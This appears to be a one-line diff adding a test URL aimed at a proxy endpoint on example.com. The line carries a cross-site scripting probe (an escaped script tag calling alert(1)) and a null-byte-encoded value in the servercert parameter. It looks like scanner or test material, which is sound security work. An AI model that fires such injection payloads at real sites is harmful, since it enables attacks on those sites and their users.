@@ -1,0 +1,1 @@
+http://www.example.com/proxy/smhui/getuiinfo?JS&amp;servercert=%0064e43&lt;script&gt;alert(1)&lt;/script&gt;7b3f58a689f
